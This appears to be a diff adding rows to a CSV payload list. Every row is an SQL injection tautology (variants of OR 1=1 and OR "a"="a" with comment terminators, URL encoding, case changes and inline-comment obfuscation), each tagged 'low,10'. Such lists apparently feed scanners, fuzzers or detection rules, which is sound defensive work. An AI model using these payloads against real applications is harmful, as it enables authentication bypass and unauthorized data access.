+""" OR 1=1 -- # oEmeD # MySQL comment",low,10
+"""%20||%201=1%20--%20#%20MySQL%20comment",low,10
+"""/**/OR/**/1=1/**/#/**//*/**/test/**/*/",low,10
+""" oR 1=1 -- # rpHHM",low,10
+"""/**/or/**/1=1/**/# -- COMMENT",low,10
+"""+||+1=1+--+/*+TEST+*/",low,10
+""" OR 1=1 -- # MySQL comment /* test */",low,10
+"""	||	1=1	# # JHbngmz",low,10
+"""%20or%201=1%20-- -- comment",low,10
+""" or 1=1 # # mYsql COMMENT",low,10
+"""%20Or%201=1%20-- # ECwXhwQoFb",low,10
+""" or 1=1 -- /* TesT */",low,10
+"""+OR+1=1+--+#+aynLLdI",low,10
+""" || 1=1 -- # MySQL comment",low,10
+"""	OR	1=1	-- -- comment",low,10
+""" OR 1=1 -- # MySQL comment # suVBBgz /* test */ /* test */",low,10
+""" || 1=1 -- /* test */",low,10
+""" or 1=1 -- # MySQL comment",low,10
+"""/**/OR/**/1=1/**/#	#	MySQL	comment",low,10
+""" Or 1=1 -- # mYSQL ComMENT",low,10
+"""+OR+1=1+--+/*+test+*/ # cgFyPuIC # MySQL comment",low,10
+"""+OR+1=1+--+--+OUkIkG # UZMwJCVHr",low,10
+"""+or+1=1+#",low,10
+"""/**/OR/**/1=1/**/--/**/#/**/BTQaGhLQ/**/#/**/MdtpMmYpI",low,10
+""" or 1=1 -- /* tEsT */",low,10
+"""%20||%201=1%20-- # MySQL comment",low,10
+"""	or	1=1	-- -- xQzwSHn",low,10
+""" OR 1=1 -- -- BCPIGLBNC",low,10
+""" OR 1=1 -- # bXBcTjQSRa",low,10
+""" OR 1=1 -- /* TEST */ -- comment",low,10
+"""/**/OR/**/1=1/**/--/**/--/**/comment # MySQL comment",low,10
+"""/**/OR/**/1=1/**/-- # MySQL comment",low,10
+"""/**/Or/**/1=1/**/--",low,10
+"""	Or	1=1	--",low,10
+"""/**/oR/**/1=1/**/#",low,10
+"""/**/||/**/1=1/**/--/**/--/**/sAEbBPam # RisVvAiV",low,10
+"""%20||%201=1%20--",low,10
+""" || 1=1 -- -- FKLJFHMB # QBLXEBAE",low,10
+"""/**/OR/**/1=1/**/-- # cqLTenlsNT",low,10
+""" || 1=1 -- -- mhbIi",low,10
+"""+Or+1=1+--",low,10
+"""++OR++1=1++--++#++MySQL++comment",low,10
+""" OR 1=1 -- /* test */ # MySQL comment",low,10
+"""%20OR%201=1%20# # BWUcPyh # MySQL comment",low,10
+"""%20or%201=1%20-- # vvsespwzqm",low,10
+"""/**/OR/**/1=1/**/--/**/#/**/uyYzQos	--	comment",low,10
+""" OR 1=1 -- # HQRxew",low,10
+""" or 1=1 -- -- comment # MySQL comment",low,10
+"""%20Or%201=1%20--",low,10
+""" or 1=1 -- /* test */",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/comment",low,10
+""" || 1=1 #",low,10
+"""+or+1=1+-- # ypyHoGZWty",low,10
+"""/**/OR/**/1=1/**/--/**/#/**/BeYAggeDtY/**//*/**/test/**/*/",low,10
+""" or 1=1 -- /* tEst */",low,10
+""" OR 1=1 -- # KCXPOYOKPM -- COMMENT",low,10
+"""%20OR%201=1%20--/**/#/**/MySQL/**/comment/**/--/**/comment",low,10
+"""%20or%201=1%20-- /* test */ # MySQL comment",low,10
+""" or 1=1 -- -- comment -- pgehhqr",low,10
+"""%20OR%201=1%20--%20#%20KVRAYXlo",low,10
+"""	or	1=1	-- # mYsql COMMENT -- comment",low,10
+""" or 1=1 -- # DlMddyfth",low,10
+""" Or 1=1 -- # sQLBgeLP /* tEst */",low,10
+"""/**/OR/**/1=1/**/#",low,10
+"""/**/Or/**/1=1/**/--/**/--/**/comment",low,10
+""" or 1=1 # -- KXxwcUX",low,10
+""" or 1=1 -- -- oxqmc",low,10
+"""	OR	1=1	--	/*	test	*/",low,10
+"""	||	1=1	--	#	MySQL	comment # MySQL comment",low,10
+"""+OR+1=1+--+/*+test+*/ -- comment",low,10
+"""%20OR%201=1%20--/**/--/**/EGDki",low,10
+"""+or+1=1+--+/*+test+*/",low,10
+"""+OR+1=1+--/**/--/**/COMMENT",low,10
+"""	||	1=1	--	/*	test	*/",low,10
+""" or 1=1 -- /* test */ -- comment",low,10
+"""%20OR%201=1%20-- /* test */",low,10
+"""	or	1=1	--	#	scbeds -- odjkkei",low,10
+"""+OR+1=1+-- -- comment",low,10
+"""+or+1=1+--+/*+TEST+*/",low,10
+"""	||	1=1	--",low,10
+""" OR 1=1 -- -- uZNrPaoyy /* test */ # kqkwDGhZm",low,10
+""" oR 1=1 # /* teST */",low,10
+""" or 1=1 # # MySQL comment",low,10
+"""/**/or/**/1=1/**/--/**/--/**/comment",low,10
+"""	OR	1=1	-- -- ypLiIWm # MySQL comment",low,10
+"""	Or	1=1	--	--	YRJEQFS",low,10
+"""%20OR%201=1%20--%20/*%20teST%20*/",low,10
+""" or 1=1 -- -- gwrhqf",low,10
+""" OR 1=1 -- # MySQL comment -- HZrCyAF",low,10
+"""++or++1=1++--+--+tWBgP",low,10
+""" || 1=1 -- -- comment",low,10
+"""+or+1=1+-- -- zknjswt",low,10
+""" || 1=1 # # MySQL comment",low,10
+""" || 1=1 # # UcXWQgL /* test */",low,10
+"""/**/OR/**/1=1/**/--%20--%20kgEbkNBLZ",low,10
+"""%20or%201=1%20--%20--%20ESQuoN",low,10
+"""+or+1=1+--",low,10
+""" OR 1=1 -- # MYSQL COMMENT",low,10
+"""/**/OR/**/1=1/**/--/**/--/**/PWudhJahru",low,10
+""" OR 1=1 -- # ggUfvGeErh",low,10
+"""+||+1=1+-- # KvDAiRk",low,10
+""" OR 1=1 -- # ZJZIP -- Qxjjad",low,10
+"""%20||%201=1%20#",low,10
+""" OR 1=1 -- /* test */ # MySQL comment /* test */",low,10
+"""/**/OR/**/1=1/**/-- -- TyRVW",low,10
+""" OR 1=1 -- -- comment # MySQL comment -- gwnSGECVHH",low,10
+"""+OR+1=1+--+#+HRKXMcJ # IFLZKw",low,10
+""" or 1=1 -- # kzpbkr",low,10
+""" OR 1=1 -- -- IIFMJ",low,10
+""" OR 1=1 -- # MySQL comment -- xrSDYRSx",low,10
+"""+OR+1=1+-- # UqyJt -- MtOpzD",low,10
+""" OR 1=1 -- # sIqDgsioL",low,10
+""" || 1=1 -- /* test */ /* test */ # MySQL comment",low,10
+"""%20or%201=1%20-- /* test */",low,10
+"""/**/OR/**/1=1/**/-- # gYCGnu",low,10
+""" OR 1=1 -- # OHGcXBhEM",low,10
+""" or 1=1 -- /* TEst */",low,10
+""" OR 1=1 -- -- CiKqHehL",low,10
+"""	OR	1=1	-- # MySQL comment",low,10
+""" OR 1=1 # -- eOeAETVr",low,10
+"""+||+1=1+--+/*+test+*/",low,10
+"""	or	1=1	--	#	MySQL	comment",low,10
+""" OR 1=1 # # JhRNBl",low,10
+"""/**/or/**/1=1/**/--/**//*/**/test/**/*/",low,10
+""" || 1=1 -- /* teSt */",low,10
+""" OR 1=1 -- # FWJAJBRDH -- KZLFZHXTG",low,10
+""" OR 1=1 -- /* test */ -- xPaIE",low,10
+"""+OR+1=1+# /* test */",low,10
+""" OR 1=1 -- # gCACHPSyY -- nIBps",low,10
+"""+OR+1=1+--+#+MySQL+comment",low,10
+"""+OR+1=1+--+--+dOjKq",low,10
+""" oR 1=1 -- # MySQL comment",low,10
+"""%20OR%201=1%20# -- comment",low,10
+"""  or  1=1  # # MySQL comment",low,10
+"""+OR+1=1+-- /* test */",low,10
+"""  ||  1=1  --  --  LlnJCGdN  #  MySQL  comment",low,10
+"""/**/OR/**/1=1/**/# /* test */",low,10
+""" or 1=1 -- # VbHCPAV",low,10
+"""%20oR%201=1%20-- /* test */",low,10
+"""/**//**/OR/**//**/1=1/**//**/--/**//**/#/**//**/MySQL/**//**/comment",low,10
+""" OR ""a""=""a""",low,10
+"""+or+""a""=""a""",low,10
+""" || ""a""=""a"" # MySQL comment",low,10
+"""%20||%20""a""=""a""",low,10
+""" OR ""a""=""a"" -- uppVSGW",low,10
+"""/**/OR/**/""a""=""a""/**/--/**/comment",low,10
+""" OR ""a""=""a"" # hXjqtWIMo",low,10
+""" or ""A""=""A""",low,10
+"""+OR+""a""=""a""",low,10
+"""+OR+""a""=""a""+#+MySQL+comment",low,10
+""" or ""A""=""a""",low,10
+"""	OR	""a""=""a""",low,10
+""" OR ""a""=""a"" /* test */",low,10
+"""%20OR%20""a""=""a""",low,10
+""" || ""a""=""a"" -- bAaxjTFcD",low,10
+""" OR ""a""=""a"" -- MTeOltNgL",low,10
+""" OR ""a""=""a"" -- comment",low,10
+""" Or ""a""=""A""",low,10
+"""%20or%20""A""=""a""",low,10
+""" OR ""a""=""a"" -- WGwbxLwin",low,10
+""" or ""a""=""a""",low,10
+""" OR ""a""=""a"" # hWTVIP",low,10
+""" OR ""a""=""a"" # jJsSiW",low,10
+""" OR ""a""=""a"" -- PNCGQ # lBIrQH",low,10
+""" || ""a""=""a""",low,10
+"""/**/OR/**/""a""=""a""",low,10
+"""	or	""a""=""a""",low,10
+""" OR ""a""=""a"" # MySQL comment -- sTZNi",low,10
+""" OR ""A""=""A"" -- comment",low,10
+"""%20OR%20""a""=""a"" /* test */ # MySQL comment",low,10
+""" OR ""a""=""a"" -- xeItf",low,10
+"""+OR+""a""=""a""+--+MMZkXaxE",low,10
+"""+OR+""A""=""A""",low,10
+"""+||+""a""=""a""",low,10
+""" OR ""a""=""a"" # MySQL comment # MFmxu",low,10
+""" OR ""a""=""a"" # MySQL comment",low,10
+""" OR ""A""=""A""",low,10
+""" OR ""a""=""a"" -- fYJBiJGZed -- comment",low,10
+"""+OR+""a""=""a""+#+yhRHDXCt+--+comment",low,10
+"""%20OR%20""a""=""a"" -- comment",low,10
+""" OR ""a""=""a"" # vVGSG",low,10
+"""/**/OR/**/""A""=""A""",low,10
+"""%20OR%20""a""=""a""%20/*%20test%20*/",low,10
+"""	OR	""a""=""a"" -- ggcILuMhY",low,10
+""" OR ""a""=""a"" # arbFcFbrn",low,10
+""" oR ""a""=""A"" -- vLxae",low,10
+"""/**/||/**/""a""=""a""",low,10
+""" || ""A""=""a""",low,10
+""" or ""A""=""A"" # MSUAzjwY",low,10
+"""/**/OR/**/""a""=""a""/**/--/**/bIpUmgTusE",low,10
+""" || ""A""=""A""",low,10
+""" || ""a""=""a"" /* test */",low,10
+""" OR ""a""=""a"" # comment",low,10
+""" OR ""a""=""a"" -- nKNQxh",low,10
+""" OR ""A""=""A"" # MYSQL COMMENT",low,10
+""" OR ""A""=""a""",low,10
+""" OR ""a""=""a"" # aLYTV",low,10
+"""%20or%20""a""=""a""",low,10
+""" OR ""a""=""a"" # ncxhdNk",low,10
+"""/**/OR/**/""a""=""a""/**/--/**/comment/**/#/**/HNkTpa",low,10
+"""+or+""a""=""a"" -- PGcvZQO",low,10
+""" OR ""A""=""A"" # MySQL comment",low,10
+""" OR ""a""=""a"" -- comment -- MAzlnfJ",low,10
+""" OR ""a""=""a"" -- KUBIh -- comment",low,10
+"""%20or%20""a""=""a"" # kTjFFVmf",low,10
+""" oR ""a""=""A""",low,10
+""" oR ""A""=""A""",low,10
+""" OR ""a""=""a"" # dnWAjkrMPb",low,10
+""" OR ""a""=""a"" -- teDyjdJZap",low,10
+"""/**/OR/**/""A""=""A""/**/--/**/RCSFRAFFC",low,10
+"""+or+""A""=""A""",low,10
+""" Or ""A""=""A""",low,10
+"""+OR+""a""=""a"" /* test */",low,10
+""" OR ""a""=""a"" -- AtvZSEbDk # KsMnwev",low,10
+""" OR ""a""=""a"" -- TjAzzQ",low,10
+""" or ""a""=""a"" /* test */ -- ejkECZ",low,10
+"""/**/OR/**/""a""=""a""/**/#/**/MySQL/**/comment",low,10
+"""%20OR%20""a""=""a"" # mGjXXTYMJ",low,10
+"""%20OR%20""A""=""a""",low,10
+"""%20OR%20""A""=""A""",low,10
+"""/**/OR/**/""A""=""A"" # NjkZJMkf",low,10
+""" OR ""a""=""a"" # whExNETB",low,10
+"""/**/or/**/""A""=""A""",low,10
+"""	OR	""a""=""a"" # VDHcXYBj # MySQL comment",low,10
+""" OR ""a""=""a"" # MySQL comment /* test */",low,10
+""" OR ""a""=""a"" # xlHPHgU",low,10
+"""/**/oR/**/""A""=""A""",low,10
+""" || ""a""=""a"" -- comment",low,10
+"""	or	""A""=""A""",low,10
+""" OR ""a""=""a"" -- Xwegmrx",low,10
+"""+OR+""a""=""a"" -- comment /* test */",low,10
+""" OR ""a""=""a"" # mqLVwHK",low,10
+""" OR ""a""=""A"" # MYSqL COMMEnt",low,10
+""" || ""A""=""A"" -- CpcZKy",low,10
+"""+Or+""A""=""a""+#+mYsQL+CommenT",low,10
+"""  OR  ""A""=""A""",low,10
+"""	OR	""A""=""A""",low,10
+""" OR ""a""=""a"" -- xpYzcGym # kHstigdrlL",low,10
+"""/**/or/**/""A""=""A""/**//*/**/TEST/**/*/",low,10
+"""/**/OR/**/""a""=""a"" # QuCBiatf",low,10
+""" OR ""a""=""a"" # LNuXhESqv",low,10
+""" OR ""a""=""a"" # RngNwsrt",low,10
+""" OR ""a""=""a"" # ofOzg",low,10
+"""  OR  ""a""=""a""",low,10
+"""/**/or/**/""a""=""a""",low,10
+""" OR ""a""=""a"" -- JZwhob -- comment",low,10
+""" or ""A""=""A"" # mYsql COMMENT -- wOIwTs",low,10
+"""	OR	""a""=""a"" -- gXpXaZHE",low,10
+""" || ""a""=""a"" # eFmjKqj # MySQL comment",low,10
+"""+OR+""a""=""a""+--+comment+--+comment",low,10
+"""%20or%20""A""=""A""%20#%20MySQL%20comment",low,10
+""" || ""a""=""a"" # bogtP -- comment",low,10
+"""	oR	""a""=""a"" # iGdDstn",low,10
+"""/**/OR/**/""a""=""a"" -- comment -- comment",low,10
+""" OR ""a""=""a"" -- VtDUrY /* test */",low,10
+"""	Or	""A""=""A"" -- comment /* test */",low,10
+"""%20or%20""A""=""A""",low,10
+"""	OR	""a""=""a""	--	ZAElJ # MySQL comment",low,10
+""" or ""a""=""A""",low,10
+"""  or  ""A""=""A"" # GomOI",low,10
+"""	OR	""a""=""a""%20--%20ZsyMvzRse%20--%20cirxTe",low,10
+"""+||+""A""=""A""+--+JVJHCEZA",low,10
+""" OR ""a""=""a"" # kCbHiZSV",low,10
+"""/**/OR/**/""a""=""a"" -- comment",low,10
+"""%20OR%20""A""=""A""%20--%20JARGNXUYZ",low,10
+"""	OR	""a""=""a""	#	CTMGRwhw	/*	test	*/	#	NVDmhCtX",low,10
+""" OR ""a""=""a"" # YZxVyR",low,10
+""" OR ""a""=""a"" # llDzzPk /* test */",low,10
+""" || ""a""=""A"" # MySQL comment",low,10
+"""+or+""a""=""a"" -- fjvtlboqfr /* test */",low,10
+"""+or+""A""=""A"" -- hGYTNTq",low,10
+"""	oR	""A""=""A""",low,10
+""" OR ""a""=""a"" -- comment -- AZHaqZM",low,10
+"""/**/OR/**/""a""=""a""/**/#/**/KrooZFcN/**/--/**/yrqMlh/**/#/**/MySQL/**/comment",low,10
+""" or ""a""=""a"" -- comment",low,10
+""" Or ""a""=""a"" # MySQL comment",low,10
+"""/**/oR/**/""A""=""A""/**/#/**/mysQL/**/coMMEnT",low,10
+"""+OR+""a""=""a""+--+comment /* test */",low,10
+"""%20OR%20""a""=""a"" /* test */ # gIXHTb",low,10
+""" OR ""A""=""A"" -- COMMENT # PFUMSBTVD -- CFJmW",low,10
+""" or ""a""=""a"" -- GodNXqwA",low,10
+"""	||	""a""=""a""",low,10
+""" or ""A""=""A"" -- rbaDhWlrfQ",low,10
+""" oR ""A""=""A"" -- qFhvXeiEB",low,10
+""" or ""A""=""A"" # ZsWzLHtQ -- COMMENT",low,10
+"""	||	""a""=""a"" # MySQL comment",low,10
+""" OR ""a""=""a"" /* test */ # MySQL comment",low,10
+"""	OR	""a""=""a""	--	comment+#+NqpKau # MySQL comment",low,10
+"""%20oR%20""a""=""a""%20/*%20tesT%20*/ /* test */",low,10
+"""+||+""a""=""a""+#+MySQL+comment",low,10
+"""/**/||/**/""A""=""A""/**/--/**/comment",low,10
+"""%20OR%20""a""=""a""/**/#/**/MySQL/**/comment",low,10
+""" || ""a""=""a"" -- mfYpjrJ",low,10
+""" or ""a""=""a"" # mysql comment",low,10
+"""%20OR%20""a""=""a""%20#%20comment",low,10
+"""%20oR%20""a""=""A""",low,10
+""" OR ""A""=""A"" # XMQUGR -- mwvuneBK",low,10
+"""	oR	""a""=""A""	/*	tEsT	*/",low,10
+""" OR ""A""=""A"" -- QSUAH",low,10
+""" OR ""a""=""a"" # JzkokO",low,10
+"""+||+""a""=""a""+#+ZirCeYCbJ",low,10
+""" OR ""a""=""a"" -- EeOlvMhIs # MySQL comment",low,10
+"""%20||%20""a""=""a""%20#%20MDjxNR",low,10
+"""+OR+""a""=""a""	--	aRLPIjl",low,10
+""" || ""A""=""A"" # MySQL comment",low,10
+"""%20OR%20""a""=""a""%20/*%20test%20*/ /* test */",low,10
+""" OR ""a""=""a"" -- comment # MySQL comment",low,10
+""" OR ""a""=""a"" # MYSQl COmmEnT",low,10
+"""/**//**/OR/**//**/""a""=""a"" # MySQL comment /* test */ /* test */",low,10
+""" OR ""a""=""a"" /* test */ -- pauwkUzMb",low,10
+""" || ""a""=""a"" # poOgdRQ -- comment",low,10
+""" || ""a""=""a"" -- comment -- pTcPcFve",low,10
+"""%20%20OR%20%20""a""=""a""",low,10
+"""+or+""a""=""a""+--+comment -- comment",low,10
+""" OR ""a""=""a"" -- dUAJvpZlZe",low,10
+"""+||+""a""=""a"" # JgmBDIE",low,10
+"""+oR+""a""=""a""",low,10
+"""+Or+""A""=""A"" # ggCiNs",low,10
+"""	OR	""a""=""a"" /* test */",low,10
+"""  OR  ""a""=""a"" -- mkltlq # SQhouhggy /* test */",low,10
+""" or ""A""=""A"" -- UGBQWH -- comment",low,10
+"""/**/OR/**/""a""=""a""/**//*/**/test/**/*/",low,10
+""" oR ""a""=""a"" -- comment",low,10
+""" || ""a""=""A"" # MySQl cOmmeNt -- KZUQGkIPf",low,10
+"""+oR+""A""=""a""+#+wJZec",low,10
+""" or ""A""=""A"" -- hPkXGcsjg # MySQL comment # MySQL comment",low,10
+"""/**/OR/**/""a""=""a"" # mlZXewZVRw -- comment",low,10
+"""	or	""A""=""A""	--	zDIdubILbz",low,10
+""" or ""a""=""a"" # eZqoKNSRJ",low,10
+""" OR ""a""=""a"" -- pSaKh",low,10
+""" oR ""a""=""A"" /* test */",low,10
+"""%20OR%20""a""=""a""%20#%20TzgTOhZYXQ%20--%20TYKyu",low,10
+""" OR ""a""=""A"" # EpxsyLHHJ",low,10
+""" || ""a""=""a"" -- COmMeNt # MySQL comment",low,10
+"""+OR+""a""=""a""+#+tXGEJBcxX",low,10
+"""%20OR%20""a""=""a""%20#%20yXmTYLtu",low,10
+""" OR ""A""=""A"" -- COMMENT /* TEST */ /* TEST */",low,10
+""" OR ""a""=""a"" /* test */ -- vaLjl",low,10
+"""%20||%20""a""=""a""%20--%20comment%20--%20vjrkUqZJu",low,10
+"""+||+""a""=""a"" -- ZvmvZC",low,10
+"""%20OR%20""a""=""a""%20--%20comment # GKDqAGJtyS",low,10
+""" or ""A""=""A"" /* test */",low,10
+""" OR ""a""=""a"" # MySQL comment -- mRiEnTPld /* test */",low,10
+""" OR ""A""=""A"" -- comment -- WKaqLT",low,10
+"""/**/OR/**/""a""=""a"" # liVjhWtpCF",low,10
+"""/**/OR/**/""a""=""a""/**/--/**/ylPOcJnKi/**//*/**/test/**/*/",low,10
+""" or ""A""=""A"" -- CYHRTxfd /* test */",low,10
+"""/**/OR/**/""a""=""a"" /* test */ /* test */",low,10
+""" OR ""a""=""a"" # tKRfMI /* test */",low,10
+""" OR ""a""=""a"" # OmFoZP /* test */ -- comment",low,10
+"""%20OR%20""a""=""a"" /* test */",low,10
+""" OR ""a""=""a"" # jYXaazu",low,10
+""" OR ""a""=""a"" # HMelEaeN -- comment",low,10
+"""%20OR%20""a""=""a"" -- GZTtD -- comment",low,10
+""" or ""A""=""A"" -- wTMjJvQ",low,10
+"""/**/||/**/""a""=""a""	--	CsinT",low,10
+"""/**/Or/**/""A""=""A""",low,10
+""" OR ""A""=""A"" # ZPQDMA",low,10
+""" OR ""A""=""A"" -- TIQZOH /* test */ -- comment",low,10
+"""%20OR%20""a""=""a""%20#%20MySQL%20comment",low,10
+"""%20OR%20""a""=""a""%20#%20LWepdSvxj%20#%20TrrcwTd",low,10
+"""  ||  ""a""=""a"" /* test */ /* test */",low,10
+""" or ""A""=""A"" -- comment",low,10
+"""/**/or/**/""A""=""A"" -- comment /* test */",low,10
+"""%20OR%20""a""=""a"" # MySQL comment",low,10
+"""++or++""a""=""a""",low,10
+"""%20OR%20""a""=""a"" # ZnmIE",low,10
+""" || ""A""=""A"" # YcKZaFty",low,10
+""" or ""A""=""A"" # BwvElWGS",low,10
+""" || ""A""=""a"" /* tEST */",low,10
+"""/**//**/OR/**//**/""a""=""a"" # MySQL comment",low,10
+"""/**/OR/**/""a""=""a""%20#%20TzEsqMpnK",low,10
+"""/**/or/**/""A""=""a""",low,10
+"""	OR	""a""=""a""	#	comment",low,10
+""" || ""a""=""a"" # DdBkEZ",low,10
+"""	or	""A""=""A""	/*	test	*/",low,10
+"""/**/||/**/""a""=""a"" # MySQL comment",low,10
+"""	or	""a""=""a"" /* test */",low,10
+"""%20OR%20""A""=""A"" # MySQL comment",low,10
+"""	OR	""a""=""a"" # MySQL comment",low,10
+""" OR ""A""=""A"" /* test */",low,10
+""" or ""A""=""A"" -- COMMENT",low,10
+""" or ""A""=""A"" # mYsql COMMENT",low,10
+"""/**/OR/**/""a""=""a""/**/#/**/MySQL/**/comment /* test */",low,10
+""" OR ""A""=""A"" -- COMMENT",low,10
+"""/**/||/**/""A""=""A""",low,10
+""" OR ""a""=""a"" # qNbLXt",low,10
+"""	oR	""a""=""A""",low,10
+""" oR ""a""=""A"" # MySQL comment",low,10
+""" OR ""a""=""a"" # QmXiwmE",low,10
+OR 1=1 --,low,10
+OR%201=1%20--,low,10
+OR	1=1	#,low,10
+or%201=1%20--,low,10
+OR+1=1+--+#+MySQL+comment+#+MySQL+comment,low,10
+OR  1=1  # -- comment,low,10
+OR  1=1  --,low,10
+OR/**/1=1/**/--,low,10
+OR	1=1	--,low,10
+OR 1=1 #,low,10
+OR%201=1%20-- /* test */ # BtIzC,low,10
+OR 1=1 -- /* test */,low,10
+OR 1=1 -- -- comment,low,10
+OR	1=1	-- # Mbgfenv,low,10
+|| 1=1 --,low,10
+|| 1=1 -- -- comment,low,10
+OR+1=1+-- -- comment,low,10
+OR+1=1+--,low,10
+or 1=1 --,low,10
+|| 1=1 -- -- IMdtUC,low,10
+OR+1=1+--+#+MySQL+comment,low,10
+OR%201=1%20--%20--%20comment,low,10
+OR/**/1=1/**/--/**/--/**/QUSWRLjSYn,low,10
+or 1=1 -- /* teSt */,low,10
+OR	1=1	--	--	yqOGTWCcO,low,10
+OR 1=1 -- # aOXJjbb,low,10
+OR 1=1 -- # pWndgSFGdS # MySQL comment,low,10
+OR%201=1%20-- # MySQL comment,low,10
+OR%201=1%20--%20/*%20test%20*/,low,10
+OR 1=1 -- # MySQL comment,low,10
+OR/**/1=1/**/#,low,10
+OR 1=1 -- -- COMMENT,low,10
+OR 1=1 # # comment # EdChc,low,10
+or 1=1 -- # mysql comment,low,10
+||%201=1%20--,low,10
+oR 1=1 -- # ihXfkyt,low,10
+OR+1=1+-- -- comment -- comment,low,10
+OR 1=1 -- -- leENGiLoXh,low,10
+Or 1=1 --,low,10
+OR%201=1%20-- /* test */,low,10
+OR 1=1 # # MySQL comment,low,10
+or%201=1%20-- # xYTknK,low,10
+OR/**/1=1/**/--/**//*/**/test/**/*/,low,10
+OR	1=1	--	#	MySQL	comment,low,10
+OR	1=1	-- # MySQL comment,low,10
+|| 1=1 -- # MySQL comment,low,10
+or 1=1 -- # mYsql COMMENT,low,10
+OR 1=1 -- -- ntJAdoOZ,low,10
+or 1=1 -- /* test */,low,10
+||	1=1	--,low,10
+OR 1=1 -- /* test */ /* test */,low,10
+oR 1=1 --,low,10
+or 1=1 -- /* TEST */,low,10
+or 1=1 -- -- comment -- GocBx,low,10
+OR/**/1=1/**/--/**/--/**/comment,low,10
+oR 1=1 -- -- CommenT,low,10
+OR 1=1 -- # EzEgpg,low,10
+OR+1=1+--+#+MYSQL+COMMENT,low,10
+oR%201=1%20-- -- IfyhaSIino,low,10
+OR 1=1 -- # HVovFuxDmY,low,10
+|| 1=1 -- # kRnUnTTxz -- comment,low,10
+|| 1=1 #,low,10
+OR	1=1	-- -- comment,low,10
+OR%201=1%20--%20#%20LfSFhQp,low,10
+OR 1=1 # /* tesT */,low,10
+OR	1=1	--	--	HbODVxrZr,low,10
+OR 1=1 -- -- soxOXcQbtH,low,10
+|| 1=1 -- -- WKCmY -- feLdiNLj,low,10
+Or+1=1+--,low,10
+OR/**/1=1/**/-- # MySQL comment,low,10
+OR+1=1+-- -- comment # ckhSijvX,low,10
+OR 1=1 -- -- KpYprubRry,low,10
+or 1=1 #,low,10
+or 1=1 # # uZxINyS,low,10
+OR+1=1+--  #  MySQL  comment,low,10
+or+1=1+--,low,10
+OR 1=1 -- /* test */ -- NHYrPUE,low,10
+OR	1=1	--	#	HsSuS,low,10
+OR/**/1=1/**/--/**/--/**/huZRVqw,low,10
+or/**/1=1/**/--,low,10
+OR	1=1	--+#+MySQL+comment,low,10
+OR/**/1=1/**/--/**//*/**/test/**/*/%20--%20comment /* test */,low,10
+OR+1=1+-- /* test */,low,10
+OR	1=1	--	--	FUwNUEZeVm	--	TcHcB	/*	test	*/,low,10
+oR/**/1=1/**/--,low,10
+OR 1=1 # # PwmIscghu # PStGs # xZUNPdYo # comment,low,10
+OR+1=1+#,low,10
+or%201=1%20--/**/#/**/MySQL/**/comment,low,10
+OR%201=1%20#,low,10
+Or	1=1	--,low,10
+or+1=1+--+#+OUXZENz,low,10
+|| 1=1 -- -- comment # MySQL comment /* test */,low,10
+OR+1=1+-- -- WOKBG,low,10
+OR 1=1 -- # MYsql ComMEnt /* test */,low,10
+or 1=1 -- -- amzwVApgL -- comment,low,10
+or/**/1=1/**/-- /* test */,low,10
+OR+1=1+--	--	comment,low,10
+OR 1=1 -- /* test */ # iuJGbaBeJ,low,10
+OR/**/1=1/**/--/**/#/**/MySQL/**/comment/**/--/**/vWQGpTbU,low,10
+||+1=1+# -- kQgDrefqm,low,10
+or%201=1%20--%20/*%20test%20*/ # MySQL comment,low,10
+OR+1=1+# /* test */,low,10
+OR 1=1 -- /* test */ -- wCVwSqjEv,low,10
+or+1=1+--+--+pyibmlotfx,low,10
+OR 1=1 -- -- ZCPDSuOT # vXptKNC,low,10
+oR 1=1 -- # MySql commenT,low,10
+oR%201=1%20--,low,10
+OR 1=1 -- /* test */ -- comment,low,10
+OR/**/1=1/**/-- /* test */,low,10
+OR+1=1+-- -- pddXYlZP,low,10
+||+1=1+-- -- Wstzoxo,low,10
+||+1=1+# # MySQL comment,low,10
+OR 1=1 # # OOPZKL /* test */,low,10
+oR 1=1 # /* TESt */,low,10
+oR 1=1 -- -- Swdtxyr,low,10
+or 1=1 -- -- comment # MySQL comment,low,10
+oR+1=1+--,low,10
+|| 1=1 # # MySQL comment,low,10
+or%201=1%20#,low,10
+oR+1=1+--+#+MySQl+cOMMeNT,low,10
+or%201=1%20-- # MySQL comment,low,10
+OR+1=1+--+--+comment,low,10
+OR%201=1%20--%20--%20comment%20/*%20test%20*/,low,10
+Or 1=1 -- -- comment,low,10
+OR/**/1=1/**/--%20--%20comment,low,10
+OR 1=1 -- # flvCDpVQup -- comment,low,10
+or 1=1 -- # lsQLD,low,10
+or 1=1 -- # qOpcC,low,10
+OR 1=1 # -- comment,low,10
+OR 1=1 -- # YIKFKRNCRT,low,10
+||%201=1%20--%20#%20MySQL%20comment,low,10
+OR+1=1+--+/*+test+*/+--+comment,low,10
+OR 1=1 -- # XUWPVVOEK # QNVCC,low,10
+oR%201=1%20-- # cyoszUyV,low,10
+OR 1=1 -- # ruwkafzy -- COMment,low,10
+OR/**/1=1/**/-- -- lSngebZhP,low,10
+||+1=1+--+--+UHxESQcqt,low,10
+OR	1=1	--/**/#/**/MySQL/**/comment,low,10
+or+1=1+--+#+urphpaf,low,10
+|| 1=1 -- # rDTCKyTCZT,low,10
+OR+1=1+--+--+twLOjXDR+--+comment+--+comment,low,10
+OR	1=1	--	/*	test	*/ -- EewkDgqjN,low,10
+OR+1=1+#+#+coMMenT,low,10
+OR%201=1%20# /* test */,low,10
+or 1=1 -- -- snebkl # MySQL comment,low,10
+or%201=1%20-- /* test */,low,10
+Or 1=1 -- -- NPNoKOa,low,10
+or 1=1 -- /* test */ # jpgsskkraa,low,10
+OR/**/1=1/**/-- # MySQL comment -- comment,low,10
+OR 1=1 -- # NTNTPD # MYSQL COMMENT -- rYWyGHoc,low,10
+OR  1=1  -- -- nPkWsj,low,10
+Or 1=1 -- # MysqL COMment,low,10
+OR	1=1	-- /* test */,low,10
+or+1=1+#,low,10
+or	1=1	--	/*	test	*/,low,10
+OR/**/1=1/**/-- # DUDIDIW,low,10
+or 1=1 # # COMMENT,low,10
+OR%201=1%20# -- zmCiuLMh,low,10
+or 1=1 -- /* TEST */ /* test */,low,10
+Or 1=1 #,low,10
+OR+1=1+--+/*+TEST+*/,low,10
+OR	1=1	--%20/*%20test%20*/,low,10
+OR 1=1 -- -- LouHvkuXyo,low,10
+oR 1=1 # # LvZHtAQ -- comment # jYuao,low,10
+or 1=1 -- -- comment,low,10
+OR 1=1 -- # RUrcUPo /* test */,low,10
+oR 1=1 -- # DtJMXBaJ -- mKIZpM,low,10
+OR%201=1%20--%20#%20XyBrMP,low,10
